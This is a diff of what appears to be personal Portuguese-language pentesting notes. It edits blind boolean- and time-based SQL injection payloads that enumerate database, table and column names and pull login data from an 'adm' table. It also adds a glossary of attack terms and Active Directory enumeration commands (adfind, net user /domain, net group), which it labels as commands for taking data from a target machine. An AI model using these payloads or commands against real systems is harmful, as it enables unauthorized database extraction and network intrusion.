@@ -4141,31 +4141,31 @@ Nota: Na requisição montar com a palavra null ou o número na frente ficando n
 
 Usando o BURP para testar as requisições e validar se a aplicação responde corretamente. Para dar bypass nessa vulnerabilidade deve usar os caracteres em decimal e ir perguntando para a aplicação se é verdadeiro ou não.
 
-    cond_valid' and database() = char(116,117,114,105,115,109,111) # 
+    cond_valid' and database() = char(116,117,114,105,115,109,111)%23
 
 Pergunta o nome da base
 
-    cond_valid' and length(database()) = 7 # 
+    cond_valid' and length(database()) = 7%23 
 
 Pergunta para aplicação o tamanho do nome da base de dados
 
-    cond_valid' and ascii(substring(database(),1,1)) = 100 # 
+    cond_valid' and ascii(substring(database(),1,1)) = 100%23 
 
 Pergunta se a primeira letra é 100 para perguntar a segunda letra basta alterar ,1,1 para ,2,1
 
-    cond_valid' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur")# 
+    cond_valid' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur")%23 
 
 O numero altera de acordo com a dedução do tamanho da tabela
 
-    cond_valid' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97#  
+    cond_valid' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97%23  
 
 Chutar as letras para encontrar os nomes das tabelas.
 
-    cond_valid' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105# 
+    cond_valid' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105%23 
 
 Chutar as colunas da tabela informada
 
-    cond_valid' and ascii(substring((select login from adm limit 0,1),1,1)) = 97# 
+    cond_valid' and ascii(substring((select login from adm limit 0,1),1,1)) = 97%23 
 
 Chutar os dados das colunas
 
@@ -4174,19 +4174,19 @@ Chutar os dados das colunas
 
 Baseada em tempo faz uma requisição colocando a aplicação para dar um sleep de tantos segundos, se ela demorar responder, ele é vulnerável.
 
-    ' or sleep(4)# 
+    ' or sleep(4)%23 
 
 Verifica se a aplicação aguarda 4s
 
-    ' or if (length(database()) = 7 , sleep(4),0)# 
+    ' or if (length(database()) = 7 , sleep(4),0)%23 
 
 Valida o tamanho da database
 
-    ' or if (database() = char(100,98,109,114,116,117,114) , sleep(4),0)# 
+    ' or if (database() = char(100,98,109,114,116,117,114) , sleep(4),0)%23 
 
 Adivinha os char da database
 
-    ' or if(ascii(substring(database(),1,1)) = 100, sleep(3),0)#
+    ' or if(ascii(substring(database(),1,1)) = 100, sleep(3),0)%23
 
 Chuta os char da database um por um
 
@@ -6500,6 +6500,32 @@ Construindo a Automação
 Executa o script.sh em paralelo, dessa forma, sendo mais performático a sua execução.
 
 	...
+
+## NOMENCLATURAS
+
+Browser fingerprint - Its the technic websites get informations abou your browser, gpu, resolution, plugins, time
+Forced browsing - is the way you test some directories or files or ids and others on web browser manually
+CSRF - is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
+SSRF - is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location
+Code Injection - is the action to inject code in a specific part of the page, making it run
+Image upload - Insert a peace of code in an image to run on the server
+Overpass The Hash - The Overpass The Hash/Pass The Key (PTK) attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network
+
+## PÓS GRADUAÇÃO
+
+LAB_SSI 
+
+	adfind.exe -f "objectcategory=person" > ad_users.txt
+ 
+ Find users from Active Directory and save on a file
+  
+      net user /domain > ad_users_net.txt
+      adfind.exe -f "objectcategory=computer" > ad_computers.txt
+      net group "Domain Computers" /domain > ad_computers_net.txt
+      adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
+      net group /domain > ad_goup_net.txt
+
+Comandos para exfiltração de dados da maquina alvo
 
 ## Hacking CheckList
 
